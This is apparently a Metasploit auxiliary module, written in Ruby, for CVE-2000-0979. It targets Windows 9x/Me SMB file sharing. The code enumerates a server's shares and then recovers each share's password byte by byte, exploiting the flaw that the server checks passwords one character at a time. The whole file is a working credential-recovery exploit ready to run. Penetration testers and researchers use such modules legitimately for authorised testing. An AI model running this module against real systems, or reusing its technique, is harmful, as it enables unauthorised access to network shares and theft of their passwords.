class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Auxiliary::Report

  RAP_SHARE_TYPES = {
    0 => 'DISK',
    1 => 'PRINTER',
    2 => 'DEVICE',
    3 => 'IPC'
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2000-0979 SMB Share Password Enumerator',
        'Description' => %q{
          This module exploits CVE-2000-0979, an information disclosure vulnerability
          in the share-level password authentication of Microsoft Windows 9x/Me SMB
          servers. The server validates passwords one character at a time, allowing an
          attacker to enumerate the correct password byte-by-byte based on the server
          response. A zero-length password is always accepted, and each subsequent
          character can be brute-forced individually, significantly reducing the search
          space required to recover the full share password.
        },
        'Author' => [
          'Zoltan Balazs <zoltan1.balazs@gmail.com> @zh4ck',
          'Azbil SecurityFriday Co Ltd'
        ],
        'References' => [
          ['CVE', '2000-0979'],
          ['URL', 'http://www.securityfriday.com/tools/SPC.html'],
        ],
        'DisclosureDate' => '2000-10-10',
        'License' => MSF_LICENSE,
        'Notes' => {
          'AKA' => ['Share Password Checker'],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptInt.new('DELAY', [false, 'Add delay between password probes', 0]),
        Opt::RPORT(139)
      ]
    )
  end

  def run
    delay = datastore['DELAY']
    print_status('Starting CVE-2000-0979 SMB Share Password Enumerator')

    # If the user left SMBName at the default wildcard, try a pure-Ruby
    # NBNS Node Status lookup up front — pivot-friendly via Rex::Socket::Udp —
    # so session_request is sent with a name Win9x will actually accept.
    resolve_smb_name_via_nbns

    # Phase 1: Connect and enumerate shares via RAP
    connect(versions: [1], backend: :ruby_smb, direct: false)
    smb_login

    shares = enum_shares_rap
    if shares.empty?
      print_status('No shares found')
      disconnect
      return
    end

    disconnect

    # Phase 2: Reconnect and brute-force share passwords
    connect(versions: [1], backend: :ruby_smb, direct: false)
    smb_login

    brute_force_shares(shares, delay)

    disconnect
  rescue ::Interrupt
    raise $ERROR_INFO
  rescue Rex::ConnectionTimeout => e
    print_error(e.to_s)
  rescue Rex::Proto::SMB::Exceptions::LoginError => e
    print_error(e.to_s)
  rescue RubySMB::Error::RubySMBError => e
    print_error("RubySMB error: #{e}")
  rescue StandardError => e
    print_error("#{e.class}: #{e}")
  ensure
    begin
      disconnect
    rescue StandardError # rubocop:disable Lint/SuppressedException
    end
  end

  private

  def default_smb_name?(name)
    name.nil? || name.to_s.strip.empty? || name.to_s.strip.upcase == '*SMBSERVER'
  end

  # Performs a pure-Ruby NBNS Node Status lookup (equivalent to
  # `nmblookup -A <ip>`) and, if a file-server name is found, stores it
  # on the datastore so the SMB session request uses it directly. No-op
  # when the user has supplied an explicit SMBName.
  def resolve_smb_name_via_nbns
    return unless default_smb_name?(datastore['SMBName'])

    # Windows 9x replies to destination UDP/137, not to the client's
    # source port, so the local endpoint needs to be bound to 137 to
    # receive the answer. Rex accepts 'LocalPort' at create time;
    # stdlib UDPSocket gets bound inside NodeStatus.query. Binding 137
    # is allowed for unprivileged processes when the Ruby interpreter
    # has CAP_NET_BIND_SERVICE (`sudo setcap 'cap_net_bind_service+ep'
    # $(readlink -f $(which ruby))`) or when the system has
    # `net.ipv4.ip_unprivileged_port_start` set <= 137; otherwise run
    # msfconsole under sudo, or `set SMBName <name>` explicitly.
    candidates = [
      [
        'Rex::Socket::Udp',
        lambda do
          Rex::Socket::Udp.create(
            'LocalHost' => '0.0.0.0',
            'LocalPort' => 137,
            'Context' => { 'Msf' => framework, 'MsfExploit' => self }
          )
        end
      ],
      ['UDPSocket', -> { UDPSocket.new }]
    ]

    entries = nil
    candidates.each do |label, factory|
      vprint_status("NBNS: querying #{rhost} via #{label}")
      begin
        entries = RubySMB::Nbss::NodeStatus.query(rhost, udp_socket_factory: factory)
      rescue StandardError => e
        vprint_error("NBNS #{label} lookup raised: #{e.class}: #{e}")
        next
      end
      if entries
        vprint_status("NBNS: #{label} returned a name table")
        break
      else
        vprint_status("NBNS: #{label} returned no data")
      end
    end

    unless entries
      vprint_status('NBNS: no usable response from any UDP path')
      return
    end

    vprint_status("NBNS name table (#{entries.length} entries):")
    entries.each { |entry| vprint_status("  #{entry}") }

    file_server = entries.find { |entry| entry.suffix == 0x20 && entry.unique? }
    if file_server
      print_status("Resolved NetBIOS name via NBNS: #{file_server.name}")
      datastore['SMBName'] = file_server.name
    else
      vprint_status('NBNS: no unique <20> (file server) entry in name table')
    end
  end

  def enum_shares_rap
    shares = []
    raw_shares = simple.client.net_share_enum_rap(rhost)
    raw_shares.each do |s|
      type_str = RAP_SHARE_TYPES.fetch(s[:type], "UNKNOWN(#{s[:type]})")
      shares << s[:name]
      print_good("#{s[:name]} - (#{type_str})")
    end
    print_good("Number of shares: #{shares.length}")
    shares
  rescue StandardError => e
    print_error("Share enumeration failed: #{e}")
    []
  end

  # Sends a TreeConnect request with exact password bytes and returns
  # success/failure without raising on bad status.
  def try_tree_connect(share_path, password_bytes)
    request = RubySMB::SMB1::Packet::TreeConnectRequest.new
    request.smb_header.tid = 65_535

    pass_str = password_bytes.pack('C*')
    request.parameter_block.password_length = pass_str.length
    request.data_block.password = pass_str
    request.data_block.path = share_path

    raw_response = simple.client.send_recv(request)
    response = RubySMB::SMB1::Packet::TreeConnectResponse.read(
      raw_response
    )

    status = response.smb_header.nt_status.value
    success = status == 0
    tid = response.smb_header.tid if success

    vprint_status(
      "TreeConnect #{share_path} pw=#{password_bytes.map { |b| '%02X' % b }.join} " \
      "nt_status=0x#{status.to_s(16).rjust(8, '0')}"
    )

    { success: success, tid: tid }
  rescue StandardError => e
    vprint_error("Tree connect error: #{e}")
    { success: false, tid: nil }
  end

  def send_tree_disconnect(tid)
    request = RubySMB::SMB1::Packet::TreeDisconnectRequest.new
    request.smb_header.tid = tid
    simple.client.send_recv(request)
  rescue StandardError => e
    vprint_error("Tree disconnect error: #{e}")
  end

  def brute_force_shares(shares, delay)
    shares.each do |share|
      share_path = "\\\\#{rhost}\\#{share}"
      print_status("Brute-forcing password for share: #{share}")

      password = [0x20]

      loop do
        result = try_tree_connect(share_path, password)

        if result[:success]
          if password[0] == 0x20 && password[1] == 0x20
            print_good("Empty password works for share: #{share}")
            send_tree_disconnect(result[:tid]) if result[:tid]
            break
          end

          confirmed = password.select { |v| v < 128 }.map(&:chr).join
          print_status("Share #{share} - confirmed so far: #{confirmed}")

          send_tree_disconnect(result[:tid]) if result[:tid]
          password.push(0x20)
        else
          password[-1] += 1

          vprint_status(
            password.select { |v| v < 128 }.map(&:chr).join
          )

          sleep(delay) if delay > 0
          sleep(0.01)

          if password[-1] > 128
            found = password.select { |v| v < 128 }.map(&:chr).join
            if password.length > 1
              print_good("Password found for share #{share}: #{found}")
            else
              print_status("Password not found for share: #{share}")
            end
            break
          end
        end
      rescue IOError, SocketError, SystemCallError => e
        print_error(e.message)
        break
      end
    end
  end
end
